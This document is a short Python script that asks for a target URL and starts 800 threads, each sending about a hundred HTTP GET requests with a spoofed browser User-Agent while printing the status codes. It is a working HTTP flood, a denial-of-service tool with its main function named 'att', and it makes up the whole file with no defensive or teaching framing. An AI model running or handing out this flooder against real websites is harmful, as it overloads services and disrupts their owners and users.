import httpx
import asyncio
import threading
from colorama import Fore
url = input("url ")
async def att():
	httpx.get(url)
	for o in range(100):
		try:
			a=httpx.get(url,headers={        
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38",
           })
			print(Fore.YELLOW+"",a.status_code,Fore.WHITE+"httpx")			       
		except:
			pass
def b():
	i = 0
	if i==1:
		i=0		
	try:
		asyncio.run([att][i]())
	except:
		pass 
for o in range(800):
	try:
		threading.Thread(target=b).start()
	except:
		pass
	

            
            	
